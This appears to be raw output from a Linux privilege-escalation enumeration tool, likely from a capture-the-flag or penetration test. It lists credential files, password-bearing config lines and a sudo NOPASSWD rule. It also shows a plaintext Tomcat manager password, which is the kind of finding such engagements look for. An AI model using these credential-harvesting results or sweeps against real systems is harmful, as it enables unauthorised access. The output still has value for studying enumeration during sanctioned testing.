2020-06-17 16:22:29,697 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-17 21:48:55,526 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-17 21:48:55,527 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-17 21:51:57,307 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-17 21:51:57,307 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-17 21:58:23,207 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-17 21:58:23,207 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-06-20 20:54:45,128 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-06-20 20:54:45,128 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-08-13 23:14:33,552 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-08-13 23:14:33,553 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
[    4.563395] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
[    4.621970] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
[    5.165284] systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
[    5.166141] systemd[1]: Condition check resulted in Forward Password Requests to Plymouth Directory Watch being skipped.
[    5.235083] systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
[    5.237777] systemd[1]: Condition check resulted in Forward Password Requests to Plymouth Directory Watch being skipped.
 base-passwd depends on libc6 (>= 2.8); however:

╔══════════╣ Finding emails inside logs (limit 70)
      4 ftpmaster@ubuntu.com                                                                                        
      3 giometti@linux.it
      3 dm-devel@redhat.com

╔══════════╣ Finding *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                          
/snap/core18/1705/bin/systemd-ask-password
/snap/core18/1705/bin/systemd-tty-ask-password-agent
/snap/core18/1705/etc/pam.d/common-password
/snap/core18/1705/lib/systemd/systemd-reply-password
/snap/core18/1705/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/snap/core18/1705/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/snap/core18/1705/lib/systemd/system/systemd-ask-password-console.path
/snap/core18/1705/lib/systemd/system/systemd-ask-password-console.service
/snap/core18/1705/lib/systemd/system/systemd-ask-password-wall.path
/snap/core18/1705/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folder

/snap/core18/1705/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/snap/core18/1705/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/snap/core18/1705/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/snap/core18/1705/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/snap/core18/1705/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc                                                                                      
/snap/core18/1705/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/snap/core18/1705/usr/share/pam/common-password
/snap/core18/1705/usr/share/pam/common-password.md5sums
/snap/core18/1705/var/lib/pam/password
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/component_validate_password.so
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-38.pyc
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-38.pyc
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz

╔══════════╣ Finding passwords inside key folders (limit 70) - only PHP files
                                                                                                                    
╔══════════╣ Finding passwords inside key folders (limit 70) - no PHP files
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.         
/etc/cloud/cloud.cfg:     lock_passwd: True
/etc/cloud/cloud.cfg:     sudo: ["ALL=(ALL) NOPASSWD:ALL"]
/etc/debconf.conf:#BindPasswd: secret
/etc/java-11-openjdk/management/management.properties:# com.sun.management.jmxremote.password.file=filepath
/etc/java-11-openjdk/management/management.properties:# com.sun.management.jmxremote.password.toHashes = true|false
/etc/java-11-openjdk/management/management.properties:#          javax.net.ssl.keyStorePassword=<keystore-password>
/etc/java-11-openjdk/management/management.properties:#          javax.net.ssl.trustStorePassword=<truststore-password>
/etc/nsswitch.conf:passwd:         files systemd
/etc/overlayroot.conf:#      $ MAPNAME="secure"; DEV="/dev/vdg"; PASSWORD="foobar"
/etc/overlayroot.conf:#     crypt:dev=/dev/vdb,pass=somepassword,mkfs=0
/etc/pam.d/common-password:password     [success=1 default=ignore]      pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword          = A challenge password
/etc/ssl/openssl.cnf:challengePassword_max              = 20
/etc/ssl/openssl.cnf:challengePassword_min              = 4
/etc/ssl/openssl.cnf:# input_password = secret
/etc/ssl/openssl.cnf:# output_password = secret
/etc/tomcat9/tomcat-users.xml:  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
/etc/tomcat9/tomcat-users.xml:  <user username="role1" password="<must-be-changed>" roles="role1"/>
/etc/tomcat9/tomcat-users.xml:   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
/etc/tomcat9/tomcat-users.xml:  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \

╔══════════╣ Finding possible password variables inside key folders (limit 140)
                                                                                                                    
╔══════════╣ Finding possible password in config files
                                                                                                                    
╔══════════╣ Finding 'username' string inside key folders (limit 70)
/etc/tomcat9/tomcat-users.xml:  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>           
/etc/tomcat9/tomcat-users.xml:  <user username="role1" password="<must-be-changed>" roles="role1"/>
/etc/tomcat9/tomcat-users.xml:   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
/etc/tomcat9/tomcat-users.xml:  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>

╔══════════╣ Searching specific hashes inside files - less false positives (limit 70)
